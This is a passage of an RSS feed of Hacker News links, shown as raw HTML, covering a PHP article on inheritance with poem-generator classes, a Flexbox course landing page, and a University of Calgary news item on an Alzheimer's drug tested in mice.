        <span>return</span> <span>"This is {$this-&gt;<span>phrase</span>($number)}."</span>;
    }

    <span>protected</span> <span><span>function</span> <span>phrase</span><span>(<span>int</span> $number)</span>: <span>string</span>
    </span>{
        $parts = <span>array_slice</span>(<span>self</span>::<span>$data</span>, -$number, $number);

        <span>return</span> <span>implode</span>(<span>"\n        "</span>, $parts);
    }
}</code></pre>
    <p>It seems like our solution works: we can use <code><span>phrase</span></code> to take x-amount of items from the end of our data array and implode those into one phrase; next we use <code><span>generate</span></code> to wrap the final result with <code>This is</code> and <code>.</code>. By the way, I implode on that spaced delimiter just to format the output a little nicer.</p>
    <pre><code>$generator = <span>new</span> <span>PoemGenerator</span>();

$generator-&gt;<span>generate</span>(<span>4</span>);




</code></pre>
    <p>Exactly what we'd expect the result to be.</p>
    <hr>
    <p>Then comes along… a new feature request. Let's build a <em>random</em> poem generator: it will randomise the order of the phrases. How do we solve this in a clean way without copying and duplicating code? Inheritance to the rescue — right?
        First let's do a little refactor, let's add a protected <code><span>data</span></code> method, so that we have a little more flexibility in what it actually returns:</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    <span>protected</span> <span><span>function</span> <span>phrase</span><span>(<span>int</span> $number)</span>: <span>string</span>
    </span>{
        $parts = <span>array_slice</span>(<span><span>$this</span>-&gt;<span>data</span>()</span>, -$number, $number);

        <span>return</span> <span>implode</span>(<span>"\n        "</span>, $parts);
    }

<span>    <span>protected</span> <span><span>function</span> <span>data</span><span>()</span>: <span>array</span>
    </span>{
        <span>return</span> [
            <span>'the horse and the hound and the horn that belonged to'</span>,
            
            <span>'the house that Jack built'</span>,
        ];
    }</span>}</code></pre>
    <p>Next we build our <code><span>RandomPoemGenerator</span></code>:</p>
    <pre><code><span><span>class</span> <span>RandomPoemGenerator</span> <span>extends</span> <span>PoemGenerator</span>
</span>{
    <span>protected</span> <span><span>function</span> <span>data</span><span>()</span>: <span>array</span>
    </span>{
        $data = <span>parent</span>::<span>data</span>();

        <span>shuffle</span>($data);

        <span>return</span> $data;
    }
}</code></pre>
    <p>How great is inheritance! We only needed to override a small part of our code, and everything works just as expected!</p>
    <pre><code>$generator = <span>new</span> <span>RandomPoemGenerator</span>();

$generator-&gt;<span>generate</span>(<span>4</span>);</code></pre>
    <pre><code>This is the priest all shaven and shorn that married
        the cow with the crumpled horn that tossed
        the man all tattered and torn that kissed
        the rooster that crowed in the morn that woke.</code></pre>
    <p>Awesome!</p>
    <hr>
    <p>Once again… a new feature request: an echo generator: it repeats every line a second time. So you'd get this:</p>
    <pre><code>This is the malt that lay in the malt that lay in
        the house that Jack built the house that Jack built.</code></pre>
    <p>We can solve this; inheritance — right?</p>
    <p>Let's again do a small refactor in <code><span>PoemGenerator</span></code>, just to make sure our code stays clean! Let's extract the array slicing functionality in <code><span>phrase</span></code> to its own method, because that's a better separation of concerns — which we learned is a good thing!</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    

    <span>protected</span> <span><span>function</span> <span>phrase</span><span>(int $number)</span>: <span>string</span>
    </span>{
        $parts = <span><span>$this</span>-&gt;<span>parts</span>($number)</span>;

        <span>return</span> <span>implode</span>(<span>"\n        "</span>, $parts);
    }

<span>    <span>protected</span> <span><span>function</span> <span><span>parts</span></span><span>(int $number)</span>: <span>array</span>
    </span>{
        <span>return</span> <span>array_slice</span>(<span>$this</span>-&gt;<span>data</span>(), -$number, $number);
    }</span>}</code></pre>
    <p>Having refactored this, implementing <code><span>EchoPoemGenerator</span></code> is again very easy:</p>
    <pre><code><span><span>class</span> <span>EchoPoemGenerator</span> <span>extends</span> <span>PoemGenerator</span>
</span>{
    <span>protected</span> <span><span>function</span> <span>parts</span><span>(<span>int</span> $number)</span>: <span>array</span>
    </span>{
        <span>return</span> <span>array_reduce</span>(
            <span>parent</span>::<span>parts</span>($number),
            <span>fn</span> (<span><span>array</span></span> $output, <span>string</span> $line) =&gt; [...$output, <span>"{$line} {$line}"</span>],
            []
        );
    }
}</code></pre>
    <p>Can we take a moment to appreciate the power of inheritance? We've created two different implementations of our original <code><span>PoemGenerator</span></code>, and have <em>only</em> overridden the parts that differ from it in <code><span>RandomPoemGenerator</span></code> and <code><span>EchoPoemGenerator</span></code>. We've even used SOLID principles to ensure that our code is decoupled so that it's easy to override specific parts. This is what great OOP is about — right?</p>
    <hr>
    <p>One more time… another feature request: please make one more implementation, one that combines both the random and echo behaviour: <code><span>RandomEchoPoemGenerator</span></code>.</p>
    <p>Now what? Which class will that one extend?</p>
    <p>If we're extending <code><span>PoemGenerator</span></code>, we'll have to override both our <code><span>data</span></code> and <code><span>parts</span></code> methods, essentially copying code from both <code><span>RandomPoemGenerator</span></code> and <code><span>EchoPoemGenerator</span></code>. That's bad design, …</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://front-line-php.com/object-oriented">https://front-line-php.com/object-oriented</a></em></p>]]>
            </description>
            <link>https://front-line-php.com/object-oriented</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939258</guid>
            <pubDate>Fri, 30 Oct 2020 04:44:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Learn Flexbox with 30 Code Tidbits]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939224">thread link</a>) | @nilsandrey
<br/>
October 29, 2020 | https://www.samanthaming.com/flexbox30/ | <a href="https://web.archive.org/web/*/https://www.samanthaming.com/flexbox30/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="app" data-server-rendered="true"><div><p>
      🔥 NEW Code Tidbit Every Week 🔥
    </p> <header><nav data-v-51356df1=""><div data-v-51356df1=""> <ul data-v-51356df1=""><li data-v-51356df1=""><a href="https://www.samanthaming.com/" name="Go to Home Page - SamanthaMing.com" data-v-51356df1=""><img src="https://www.samanthaming.com/images/samantha-ming-logo.svg" alt="Samantha Ming Logo" data-v-51356df1=""> <span data-v-51356df1="">Samantha Ming</span></a></li> <li data-v-51356df1=""><a href="https://www.samanthaming.com/tidbits/" data-v-51356df1="">
          Tidbits
        </a></li><li data-v-51356df1=""><a href="https://www.samanthaming.com/blog/" data-v-51356df1="">
          Blog
        </a></li><li data-v-51356df1=""><a href="https://www.samanthaming.com/courses/" data-v-51356df1="">
          Courses
        </a></li><li data-v-51356df1=""><a href="https://www.samanthaming.com/contact/" data-v-51356df1="">
          Contact
        </a></li></ul> <div data-v-51356df1=""></div></div></nav> </header>  <main><div><div><div><a href="https://www.samanthaming.com/flexbox30/1-flexbox-intro/"><img src="https://samanthaming.gumlet.io/courses/flexbox30.jpg.gz?format=auto" alt="Flexbox30" data-v-067b84ea=""> <p>
            Start Course
          </p></a></div></div> <div><div><div><div> <p>
      Learn Flexbox with 30 Code Tidbits ✨
      <a href="https://www.samanthaming.com/flexbox30/1-flexbox-intro/">
        Start Course
      </a> </p></div></div></div></div></div> <div><ul><li><a href="https://twitter.com/intent/tweet?text=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8&amp;url=https://www.samanthaming.com/flexbox30/&amp;via=samantha_ming" title="Share this course on Twitter" rel="noopener noreferrer" target="_blank" data-analytics-social="Twitter"> <span>Share to Twitter</span> <span>Twitter</span></a></li><li><a href="https://www.facebook.com/sharer/sharer.php?text=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8&amp;u=https://www.samanthaming.com/flexbox30/" title="Share this course on Facebook" rel="noopener noreferrer" target="_blank" data-analytics-social="Facebook"> <span>Share to Facebook</span> <span>Facebook</span></a></li><li><a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https://www.samanthaming.com/flexbox30/&amp;smid=li-share&amp;title=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8" title="Share this course on LinkedIn" rel="noopener noreferrer" target="_blank" data-analytics-social="LinkedIn"> <span>Share to LinkedIn</span> <span>LinkedIn</span></a></li><li><a href="https://reddit.com/submit?url=https://www.samanthaming.com/flexbox30/&amp;smid=re-share&amp;%20%20%20%20%20%20%20%20title=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8" title="Share this course on Reddit" rel="noopener noreferrer" target="_blank" data-analytics-social="Reddit"> <span>Share to Reddit</span> <span>Reddit</span></a></li><li><a href="https://news.ycombinator.com/submitlink?u=https://www.samanthaming.com/flexbox30/" title="Share this course on Hacker News" rel="noopener noreferrer" target="_blank" data-analytics-social="Hacker News"> <span>Share to Hacker News</span> <span>Hacker News</span></a></li><li><a href="mailto:?subject=Flexbox30%3A%20Learn%20Flexbox%20with%2030%20Code%20Tidbits%20%E2%9C%A8%20|%20SamanthaMing.com&amp;body=Learn%20Flexbox%20with%2030%20code%20tidbits.%20Become%20a%20flexbox%20ninja%20with%20this%20FREE%20course!%0A%0Ahttps://www.samanthaming.com/flexbox30/" title="Share this course on Email" rel="noopener noreferrer" target="_blank" data-analytics-social="Email"> <span>Email</span> <span>Email</span></a></li></ul></div> <section><div><div><h2>
          Flexbox Core Concepts
        </h2> <ul><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/1-flexbox-intro/" aria-label="Read the article for Introduction" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/1-flexbox-intro.jpg.gz?format=auto&amp;width=256" alt="Introduction" data-v-067b84ea=""><span>1</span></p></a> <h3 data-v-605d1001="">
    Introduction
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/2-flex-container-flex-items/" aria-label="Read the article for Flex Container &amp; Flex Items" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/2-flex-container-flex-items.jpg.gz?format=auto&amp;width=256" alt="Flex Container &amp; Flex Items" data-v-067b84ea=""><span>2</span></p></a> <h3 data-v-605d1001="">
    Flex Container &amp; Flex Items
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/3-immediate-child-only/" aria-label="Read the article for Immediate Child Only" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/3-immediate-child-only.jpg.gz?format=auto&amp;width=256" alt="Immediate Child Only" data-v-067b84ea=""><span>3</span></p></a> <h3 data-v-605d1001="">
    Immediate Child Only
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/4-flexbox-axes/" aria-label="Read the article for Flexbox Axes" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/4-flexbox-axes.jpg.gz?format=auto&amp;width=256" alt="Flexbox Axes" data-v-067b84ea=""><span>4</span></p></a> <h3 data-v-605d1001="">
    Flexbox Axes
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/5-flexbox-module/" aria-label="Read the article for Flexbox Module" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/5-flexbox-module.jpg.gz?format=auto&amp;width=256" alt="Flexbox Module" data-v-067b84ea=""><span>5</span></p></a> <h3 data-v-605d1001="">
    Flexbox Module
  </h3></li></ul></div><div><h2>
          Parent Properties
        </h2> <ul><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/6-parent-properties/" aria-label="Read the article for Parent Properties" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/6-parent-properties.jpg.gz?format=auto&amp;width=256" alt="Parent Properties" data-v-067b84ea=""><span>6</span></p></a> <h3 data-v-605d1001="">
    Parent Properties
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/7-display/" aria-label="Read the article for display" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/7-display.jpg.gz?format=auto&amp;width=256" alt="display" data-v-067b84ea=""><span>7</span></p></a> <h3 data-v-605d1001="">
    display
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/8-block-vs-inline/" aria-label="Read the article for block vs inline" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/8-block-vs-inline.jpg.gz?format=auto&amp;width=256" alt="block vs inline" data-v-067b84ea=""><span>8</span></p></a> <h3 data-v-605d1001="">
    block vs inline
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/9-flex-direction/" aria-label="Read the article for flex-direction" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/9-flex-direction.jpg.gz?format=auto&amp;width=256" alt="flex-direction" data-v-067b84ea=""><span>9</span></p></a> <h3 data-v-605d1001="">
    flex-direction
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/10-flex-wrap/" aria-label="Read the article for flex-wrap" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/10-flex-wrap.jpg.gz?format=auto&amp;width=256" alt="flex-wrap" data-v-067b84ea=""><span>10</span></p></a> <h3 data-v-605d1001="">
    flex-wrap
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/11-flex-flow/" aria-label="Read the article for flex-flow" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/11-flex-flow.jpg.gz?format=auto&amp;width=256" alt="flex-flow" data-v-067b84ea=""><span>11</span></p></a> <h3 data-v-605d1001="">
    flex-flow
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/12-justify-content-row/" aria-label="Read the article for justify-content [row]" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/12-justify-content-row.jpg.gz?format=auto&amp;width=256" alt="justify-content [row]" data-v-067b84ea=""><span>12</span></p></a> <h3 data-v-605d1001="">
    justify-content [row]
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/13-justify-content-column/" aria-label="Read the article for justify-content [column]" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/13-justify-content-column.jpg.gz?format=auto&amp;width=256" alt="justify-content [column]" data-v-067b84ea=""><span>13</span></p></a> <h3 data-v-605d1001="">
    justify-content [column]
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/14-space-around-vs-space-evenly/" aria-label="Read the article for space-around vs space-evenly" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/14-space-around-vs-space-evenly.jpg.gz?format=auto&amp;width=256" alt="space-around vs space-evenly" data-v-067b84ea=""><span>14</span></p></a> <h3 data-v-605d1001="">
    space-around vs space-evenly
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/15-align-items-row/" aria-label="Read the article for align-items [row]" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/15-align-items-row.jpg.gz?format=auto&amp;width=256" alt="align-items [row]" data-v-067b84ea=""><span>15</span></p></a> <h3 data-v-605d1001="">
    align-items [row]
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/16-baseline/" aria-label="Read the article for baseline" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/16-baseline.jpg.gz?format=auto&amp;width=256" alt="baseline" data-v-067b84ea=""><span>16</span></p></a> <h3 data-v-605d1001="">
    baseline
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/17-align-items-column/" aria-label="Read the article for align-items [column]" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/17-align-items-column.jpg.gz?format=auto&amp;width=256" alt="align-items [column]" data-v-067b84ea=""><span>17</span></p></a> <h3 data-v-605d1001="">
    align-items [column]
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/18-align-content/" aria-label="Read the article for align-content" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/18-align-content.jpg.gz?format=auto&amp;width=256" alt="align-content" data-v-067b84ea=""><span>18</span></p></a> <h3 data-v-605d1001="">
    align-content
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/27-flex/" aria-label="Read the article for flex" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/27-flex.jpg.gz?format=auto&amp;width=256" alt="flex" data-v-067b84ea=""><span>27</span></p></a> <h3 data-v-605d1001="">
    flex
  </h3></li></ul></div><div><h2>
          Child Properties
        </h2> <ul><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/19-child-properties/" aria-label="Read the article for Child Properties" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/19-child-properties.jpg.gz?format=auto&amp;width=256" alt="Child Properties" data-v-067b84ea=""><span>19</span></p></a> <h3 data-v-605d1001="">
    Child Properties
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/20-order/" aria-label="Read the article for order" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/20-order.jpg.gz?format=auto&amp;width=256" alt="order" data-v-067b84ea=""><span>20</span></p></a> <h3 data-v-605d1001="">
    order
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/21-flex-grow/" aria-label="Read the article for flex-grow" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/21-flex-grow.jpg.gz?format=auto&amp;width=256" alt="flex-grow" data-v-067b84ea=""><span>21</span></p></a> <h3 data-v-605d1001="">
    flex-grow
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/22-flex-grow-calculation/" aria-label="Read the article for flex-grow calculation" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/22-flex-grow-calculation.jpg.gz?format=auto&amp;width=256" alt="flex-grow calculation" data-v-067b84ea=""><span>22</span></p></a> <h3 data-v-605d1001="">
    flex-grow calculation
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/23-flex-shrink/" aria-label="Read the article for flex-shrink" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/23-flex-shrink.jpg.gz?format=auto&amp;width=256" alt="flex-shrink" data-v-067b84ea=""><span>23</span></p></a> <h3 data-v-605d1001="">
    flex-shrink
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/24-flex-shrink-calculation/" aria-label="Read the article for flex-shrink calculation" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/24-flex-shrink-calculation.jpg.gz?format=auto&amp;width=256" alt="flex-shrink calculation" data-v-067b84ea=""><span>24</span></p></a> <h3 data-v-605d1001="">
    flex-shrink calculation
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/25-flex-basis/" aria-label="Read the article for flex-basis" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/25-flex-basis.jpg.gz?format=auto&amp;width=256" alt="flex-basis" data-v-067b84ea=""><span>25</span></p></a> <h3 data-v-605d1001="">
    flex-basis
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/26-flex-basis-vs-widths/" aria-label="Read the article for flex-basis vs widths" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/26-flex-basis-vs-widths.jpg.gz?format=auto&amp;width=256" alt="flex-basis vs widths" data-v-067b84ea=""><span>26</span></p></a> <h3 data-v-605d1001="">
    flex-basis vs widths
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/28-align-self/" aria-label="Read the article for align-self" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/28-align-self.jpg.gz?format=auto&amp;width=256" alt="align-self" data-v-067b84ea=""><span>28</span></p></a> <h3 data-v-605d1001="">
    align-self
  </h3></li></ul></div><div><h2>
          Summary
        </h2> <ul><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/29-flexbox-properties/" aria-label="Read the article for Flexbox Properties" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/29-flexbox-properties.jpg.gz?format=auto&amp;width=256" alt="Flexbox Properties" data-v-067b84ea=""><span>29</span></p></a> <h3 data-v-605d1001="">
    Flexbox Properties
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/30-flexbox-cheatsheet/" aria-label="Read the article for Flexbox Cheatsheet" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/30-flexbox-cheatsheet.jpg.gz?format=auto&amp;width=256" alt="Flexbox Cheatsheet" data-v-067b84ea=""><span>30</span></p></a> <h3 data-v-605d1001="">
    Flexbox Cheatsheet
  </h3></li><li data-v-605d1001=""><a href="https://www.samanthaming.com/flexbox30/31-flexbox-with-auto-margins/" aria-label="Read the article for Bonus: Flexbox with Auto Margins" data-v-605d1001=""><p><img src="https://samanthaming.gumlet.io/flexbox30/31-flexbox-with-auto-margins.jpg.gz?format=auto&amp;width=256" alt="Bonus: Flexbox with Auto Margins" data-v-067b84ea=""><span>31</span></p></a> <h3 data-v-605d1001="">
    Bonus: Flexbox with Auto Margins
  </h3></li></ul></div></div></section> <section><div><hr> <div><h2>
        More Courses
      </h2> <!----> </div></div> <ul><li><a href="https://www.samanthaming.com/codetidbits30/"><div><h3>
          CodeTidbits30
        </h3> <p>
          30 days of the best JS, CSS, HTML tidbits 🎄
        </p></div></a></li><li><a href="https://www.samanthaming.com/basics/"><div><h3>
          Web Basics
        </h3> <p>
          Web Basics Explained with Tidbits 🍎
        </p></div></a></li><li><a href="https://www.samanthaming.com/pictorials/"><div><h3>
          Pictorials
        </h3> <p>
          Step by Step Code Tutorials 👣
        </p></div></a></li></ul></section> <section><div><hr> <div><h2><a href="https://www.samanthaming.com/tidbits/"><span>
      Top Tidbits
    </span> </a></h2> <!----> </div></div> <div><ul> <li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/29-check-if-number-is-positive-or-negative/" aria-label="Read the article for Math.sign: How to Check if Number is Negative or Positive in JavaScript" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/29-check-if-number-is-positive-or-negative.jpg.gz?format=auto" alt="Code snippet on Math.sign: How to Check if Number is Negative or Positive in JavaScript" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        Math.sign: How to Check if Number is Negative or Positive in JavaScript
      </h3></p></a></li><li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/11-setting-default-parameters/" aria-label="Read the article for Setting Default Parameters in JavaScript" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/11-setting-default-parameters.jpg.gz?format=auto" alt="Code snippet on Setting Default Parameters in JavaScript" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        Setting Default Parameters in JavaScript
      </h3></p></a></li><li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/45-pretty-json-output/" aria-label="Read the article for Pretty JSON output" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/45-pretty-json-output.jpg.gz?format=auto" alt="Code snippet on Pretty JSON output" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        Pretty JSON output
      </h3></p></a></li><li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/50-how-to-deep-clone-an-array/" aria-label="Read the article for How to Deep Clone an Array in JavaScript" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/50-how-to-deep-clone-an-array.jpg.gz?format=auto" alt="Code snippet on How to Deep Clone an Array in JavaScript" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        How to Deep Clone an Array in JavaScript
      </h3></p></a></li><li data-v-3d7b2715=""><a href="https://www.samanthaming.com/tidbits/89-how-to-check-if-variable-is-array/" aria-label="Read the article for How to check if Variable is an Array in JavaScript" data-v-3d7b2715=""><p><img src="https://samanthaming.gumlet.io/tidbits/89-how-to-check-if-variable-is-array.jpg.gz?format=auto" alt="Code snippet on How to check if Variable is an Array in JavaScript" data-v-067b84ea="" data-v-3d7b2715=""></p> <p data-v-3d7b2715=""><h3 data-v-3d7b2715="">
        How to check if Variable is an Array in JavaScript
      </h3></p></a></li> <p>
      hi</p></ul></div></section> </main>  </div></div></div>]]>
            </description>
            <link>https://www.samanthaming.com/flexbox30/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24939224</guid>
            <pubDate>Fri, 30 Oct 2020 04:39:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Research discovers breakthrough with potential to prevent, reverse Alzheimer's]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24939160">thread link</a>) | @walterbell
<br/>
October 29, 2020 | https://libin.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers | <a href="https://web.archive.org/web/*/https://libin.ucalgary.ca/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div>
            <div>
              <div>

                
                                
                                                  <div>
                                                                                        <p><span><span>A research team at the University of Calgary’s <a href="https://cumming.ucalgary.ca/">Cumming School of Medicine</a> (CSM) led by Dr. S.R. Wayne Chen, PhD, has made an exciting breakthrough with the potential to prevent and reverse the effects of Alzheimer’s disease.</span></span></p>

<p><span><span>The team discovered that limiting the open time of a channel called the ryanodine receptor, which acts like a gateway to cells located in the heart and brain, reverses and prevents progression of Alzheimer’s disease in animal models. They also identified a drug that interrupts the disease process.</span></span></p>

<p><span><span>The effect of giving the drug to animal models was remarkable: After one month of treatment, the memory loss and cognitive impairments in these models disappeared. </span></span></p>

<p><span><span>“The significance of identifying a clinically used drug that acts on a defined target to provide anti-Alzheimer’s disease benefits can’t be overstated,” says Chen, a member of the <a href="https://libin.ucalgary.ca/">Libin Cardiovascular Institute</a> and the <a href="https://hbi.ucalgary.ca/">Hotchkiss Brain Institute</a> at the CSM.&nbsp;</span></span><span lang="EN-US"><span><span><span>Dr. Jinjing Yao, PhD, a student of Chen, is the first author of the study.</span></span></span></span></p>

<p><span><span>The results of this groundbreaking study were recently published in the peer-reviewed journal, <a href="https://www.cell.com/cell-reports/fulltext/S2211-1247(20)31158-X"><em>Cell Reports</em></a>.&nbsp;</span></span></p>

<p><span><span>This work is potentially highly impactful as more than half a million Canadians live with Alzheimer’s disease and other dementias, suffering memory loss and other cognitive impairments with a negative impact on quality of life. </span></span></p>

<h3><strong><span><span><span><span>The science behind the findings</span></span></span></span></strong></h3>

<p><span><span>Previous research has shown that the progression of Alzheimer’s disease is driven by a vicious cycle of the protein amyloid β (Aβ) inducing hyperactivity at the neuron level. However, the mechanism behind this wasn’t fully understood nor were there effective treatments to stop the cycle. &nbsp;</span></span></p>

<p><span><span>Chen’s team used a portion of an existing drug used for heart patients, carvedilol, to treat mice models with Alzheimer’s symptoms. After a month of treatment, researchers tested animal models with very promising results. </span></span></p>

<p><span><span>“We treated them for a month and the effect was quite amazing,” says Chen, explaining the drug was successful in reversing major symptoms of Alzheimer’s disease. “We couldn’t tell the drug-treated disease models and the healthy models apart.” </span></span></p>

<p><span><span>Chen, a Clarivate Highly Cited Researcher, is optimistic about the future of this research, however, there are many steps to be taken before this finding would lead to a clinical trial.&nbsp;</span></span></p>

<p><span><span>If you are interested in finding out about clinical trials that are underway related to Alzheimer’s you can go to <a href="https://www.ucalgary.ca/research/participate/node/13200">Participate in Research</a>. There you’ll find a number of studies looking for participants including control subjects, people not living with a specific condition. </span></span></p>

<p><em><span><span>Wayne Chen is a professor in the Department&nbsp;of Physiology and Pharmacology, Biochemistry and </span></span><span><span>Molecular Biology at the CSM.&nbsp;</span></span></em><span><span><em><span lang="EN-US"><span><span>Led by the&nbsp;</span></span></span></em><a href="http://www.hbi.ucalgary.ca/"><em><span><span><span><span><span>Hotchkiss Brain Institute</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>,&nbsp;</span></span></span></em><a href="http://www.ucalgary.ca/research/brain-and-mental-health"><em><span><span><span><span><span>Brain and Mental Health</span></span></span></span></span></em></a><em><span lang="EN-US"><span><span>&nbsp;is one of six research strategies guiding the University of Calgary toward its&nbsp;Eyes High&nbsp;goals. The strategy provides a unifying direction for brain and mental health research at the university.</span></span></span></em></span></span></p>



                                                                                                                                                                                                                                      

  
    

    
  <div data-history-node-id="23525" role="article" about="/news/research-team-discovers-breakthrough-potential-prevent-reverse-alzheimers" typeof="schema:Article">
    <div>
      <div>
                          <div>
            <div>
              <div>
                <div>
                                        <picture>
                <!--[if IE 9]><video style="display: none;"><![endif]-->
              <source srcset="https://libin.ucalgary.ca/news/sites/default/files/styles/ucws_image_desktop/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=ByB_f0m8 1x" media="all and (min-width: 992px)" type="image/jpeg">
              <source srcset="https://libin.ucalgary.ca/news/sites/default/files/styles/ucws_image_tablet/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=5tYigcJ8 1x" media="all and (min-width: 768px)" type="image/jpeg">
              <source srcset="https://libin.ucalgary.ca/news/sites/default/files/styles/ucws_image_mobile/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=-CoV0v5E 1x" media="all and (max-width: 767px)" type="image/jpeg">
            <!--[if IE 9]></video><![endif]-->
            <img src="https://libin.ucalgary.ca/news/sites/default/files/styles/ucws_image_desktop/public/2020-09/20190911Libin%20Portraits-%20Dr.%20Chen%20-117.jpg?itok=ByB_f0m8" alt="Dr. Wayne Chen, PhD" title="Dr. Wayne Chen, PhD" typeof="foaf:Image">

  </picture>

                                    </div>
                                  <p>Dr. Wayne Chen, PhD</p>
